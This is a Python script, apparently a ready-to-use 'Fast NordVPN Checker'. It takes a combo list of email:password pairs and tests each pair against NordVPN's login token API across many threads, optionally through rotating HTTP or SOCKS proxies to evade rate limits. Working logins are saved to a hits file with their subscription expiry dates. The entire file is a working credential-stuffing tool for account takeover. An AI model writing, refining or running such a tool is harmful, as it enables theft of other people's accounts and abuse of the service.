import requests
import random
import os
from colorama import Fore, Style, init
import tkinter as tk 
from tkinter import filedialog
import time
import threading
from sys import stdout

init(convert=True)

lock = threading.Lock()

def free_print(arg):
    lock.acquire()
    stdout.flush()
    print(arg)
    lock.release()   

class NordVPN:
    def __init__(self):
        self.data = {
            'use_proxy': False,
            'proxy_type': None,
            'proxy_dir': None,
            'combo_dir': None,
            'checked': 0,
            'retries': 0,
            'cpm': 0,
        }

        self.custom = ''
        root = tk.Tk()
        root.withdraw()


    def __read(self,filename, method):
        output = []
        with open(filename, method, encoding='UTF-8') as file:
            lines = file.readlines()
            for l in lines:
                output.append(l.replace('\n', ''))

        return output

    def __make_copy(self):
        with open('data/temp_combo.txt', 'w', encoding='UTF-8') as file:
            accounts = self.__get_accounts()
            for x in accounts:
                file.write(x + '\n')

    def __get_accounts(self):
        account_list = self.__read(self.data['combo_dir'], 'r')
        return account_list

    def __get_proxy(self, proxy_type, direct):
        proxy_list = self.__read(self.data['proxy_dir'], 'r') 
        proxies = {'http': '%s://%s' % (self.data['proxy_type'], random.choice(proxy_list))}
        
        return proxies

    def custom_message(self, arg):
        self.custom = arg 

    def cpm_counter(self):
        while True:
            previous = self.data['checked']
            time.sleep(4)
            after =self.data['checked']
            self.data['cpm'] = (after-previous) * 15

    def update_title(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            os.system('title Fast NordVPN Checker - Checked: %s ^| Retries: %s ^| CPM: %s ^| Time Elapsed: %s ^| Threads: %s' % (self.data['checked'], self.data['retries'], self.data['cpm'], elapsed, (threading.active_count() - 2)))
            time.sleep(0.4)

    def title(self):
        print(f'''{Fore.CYAN}

    \t\t\t\t      ▐ ▄       ▄▄▄  ·▄▄▄▄       ▌ ▐· ▄▄▄· ▐ ▄ 
    \t\t\t\t     •█▌▐█▪     ▀▄ █·██▪ ██     ▪█·█▌▐█ ▄█•█▌▐█
    \t\t\t\t     ▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▐█▐█• ██▀·▐█▐▐▌
    \t\t\t\t     ██▐█▌▐█▌.▐▌▐█•█▌██. ██      ███ ▐█▪·•██▐█▌
    \t\t\t\t     ▀▀ █▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀•     . ▀  .▀   ▀▀ █▪
    \t\t\t\t                                           
            {Style.RESET_ALL}''')


    def user_proxy(self):
        self.data['use_proxy'] = True

        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose choose proxy text file. ')

        proxy_dir = filedialog.askopenfilename()
        self.data['proxy_dir'] = proxy_dir

        try:
            proxy_type = int(input(f'[{Fore.CYAN}?{Style.RESET_ALL}] HTTPS[{Fore.CYAN}0{Style.RESET_ALL}]/SOCKS4[{Fore.CYAN}1{Style.RESET_ALL}]/SOCKS5[{Fore.CYAN}2{Style.RESET_ALL}] > '))
        
        except ValueError:
            print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Value error! Please choose 0, 1, or 2!')
            time.sleep(3)            
            self.user_proxy()

        if proxy_type == 0:
            self.data['proxy_type'] = 'https'
                           
        elif proxy_type == 1:
            self.data['proxy_type'] = 'socks4'

        elif proxy_type== 2:
            self.data['proxy_type'] = 'socks5'

        else:
            print(f'[{Fore.CYAN}!{Style.RESET_ALL}] Please choose a valid int such as 0, 1, or 2!')
            time.sleep(3)
            self.user_proxy()

    def user_combo(self):
        combo_dir = filedialog.askopenfilename()
        self.data['combo_dir'] = combo_dir
        
        self.__make_copy()

    def get_accounts(self):
        account_list = self.__read('data/temp_combo.txt', 'r')
        return account_list

    def get_data(self):
        return self.data


    def checker(self, email, password):
        url = 'https://api.nordvpn.com/v1/users/tokens'
        data = {'username': email, 'password': password}

        if self.data['use_proxy']:
            proxies = self.__get_proxy(self.data['proxy_type'], self.data['proxy_dir'])

            try:

                r = requests.post(url, json=data, proxies=proxies)

                if 'Unauthorized' in r.text:
                    free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password}')
                    with open('output/bad.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))

                if 'user_id' in r.text:
                    expiry = r.json()['expires_at']
                    free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                    with open('output/raw_hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))
                    with open('output/hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s | Expiry Date: %s %s\n' %(email, password, expiry, self.custom))

                if 'Too Many Requests' in r.text:
                    free_print(f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                self.data['checked'] += 1
            except requests.exceptions.RequestException: #all requests related errors
                self.data['retries'] += 1
                self.checker(email, password)

        else:
            try:
                r = requests.post(url, json=data)

                if 'Unauthorized' in r.text:
                        free_print(f'[*] {Fore.RED}BAD{Style.RESET_ALL} | {email}:{password} ')
                        with open('output/bad.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))

                if 'user_id' in r.text:
                    expiry = r.json()['expires_at']
                    free_print(f'[*] {Fore.CYAN}HIT{Style.RESET_ALL} | {email}:{password} | expires_at : {expiry}')
                    with open('output/raw_hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s\n' % (email, password))
                    with open('output/hits.txt', 'a', encoding = 'UTF-8') as f: f.write('%s:%s | Expiry Date: %s %s\n' %(email, password, expiry, self.custom))

                if 'Too Many Requests' in r.text:
                    free_print(f'[!] {Fore.RED}ERROR, TOO MANY REQUESTS. Change your proxies or use a different VPN. {Style.RESET_ALL}')

                self.data['checked'] += 1
            except requests.exceptions.RequestException:
                self.data['retries'] += 1
                self.checker(email, password)


    def multi_threading(self):
        self.start = time.time()
        threading.Thread(target = self.cpm_counter, daemon=True).start()
        threading.Thread(target = self.update_title, daemon=True).start()

check = None

def worker(n, combos, thread_id):
    global check

    while check[thread_id] < len(combos):
        combination = combos[check[thread_id]].split(':')
        n.checker(combination[0], combination[1])
        check[thread_id] += 1 

def main():
    global check
    os.system('cls')
    os.system('title Fast Nord VPN Checker ^| Nightfall#2512')
    
    n = NordVPN()
    n.title()
    print('\n\n')

    use_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add custom message after hit? y/n  > ')

    if use_message == 'y':
        print(f'[{Fore.CYAN}>{Style.RESET_ALL}] This message will be added to the text file if it is a hit.')
        custom_message = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Add: ')
        n.custom_message(custom_message)

    use_proxy = input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Use proxy? y/n > ')

    if use_proxy == 'y':
        n.user_proxy()

    print(f'[{Fore.CYAN}>{Style.RESET_ALL}] Please choose combo list text file. (email:pass)')

    n.user_combo() #get file directory

    combos = n.get_accounts() #combo in list

    thread_count = int(input(f'[{Fore.CYAN}>{Style.RESET_ALL}] Enter number of threads > '))

    n.multi_threading()

    os.system('cls')
    n.title()
    print('\n\n')

    threads = []

    check = [0 for i in range(thread_count)]

    for i in range(thread_count):
        sliced_combo = combos[int(len(combos) / thread_count * i): int(len(combos)/ thread_count* (i+1))]
        t = threading.Thread(target=worker, args= (n , sliced_combo, i,) )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print('[!] Task completed.')

    print(check)
    os.system('pause>nul')

if __name__ =='__main__':
    main()